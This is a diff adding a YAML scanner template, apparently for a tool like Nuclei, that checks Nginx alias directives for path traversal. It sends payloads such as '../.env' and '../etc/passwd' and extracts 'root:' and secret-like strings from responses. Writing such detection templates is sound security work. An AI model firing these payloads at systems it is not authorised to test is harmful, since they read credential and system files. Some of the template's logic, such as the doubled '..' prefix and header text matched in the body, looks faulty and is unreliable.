@@ -1,0 +1,79 @@
+id: nginx-alias-traversal
+info:
+  name: Nginx Alias Path Traversal
+  risk: Medium
+  description: Detects path traversal vulnerabilities due to misconfigured Nginx alias directives without trailing slashes, allowing access to files outside the intended directory.
+  classification: cve
+  tags: nginx,traversal,intrusive
+  reference:
+    - author: pwn
+      source: Blog post on Nginx alias misconfiguration
+
+params:
+  - root: "{{BaseURL}}"
+
+variables:
+  - aliases:
+      - /assets
+      - /static
+      - /media
+  - traversal_payloads:
+      - ../app/db.php
+      - ../.env
+      - ../etc/passwd
+  - valid_files:
+      - sample.png
+      - index.html
+
+requests:
+  - method: GET
+    redirect: false
+    headers:
+      - User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3984.0 Safari/537.36
+    path:
+      - "{{.aliases}}/{{.valid_files}}"  # Test valid alias access
+      - "{{.aliases}}/{{.traversal_payloads}}"  # Test traversal
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "Server: nginx"
+          - "$user"  # Matches PHP variables like in db.php demo
+          - "root:"  # Matches /etc/passwd or similar
+        condition: or
+        part: body
+      - type: dsl
+        dsl:
+          - "len(body) > 100"  # Ensures meaningful content, not just 200 OK
+        condition: and
+
+  - method: GET
+    redirect: false
+    headers:
+      - User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3984.0 Safari/537.36
+    path:
+      - "{{.aliases}}/..{{.traversal_payloads}}"  # Test with ../ prefix
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "Server: nginx"
+          - "$user"
+          - "root:"
+        condition: or
+        part: body
+      - type: dsl
+        dsl:
+          - "len(body) > 100"
+        condition: and
+
+extractors:
+  - type: regex
+    name: traversed-file
+    regex:
+      - "(appuser|secret|root:.*?:)"  # Extracts sensitive data if present
+    internal: true
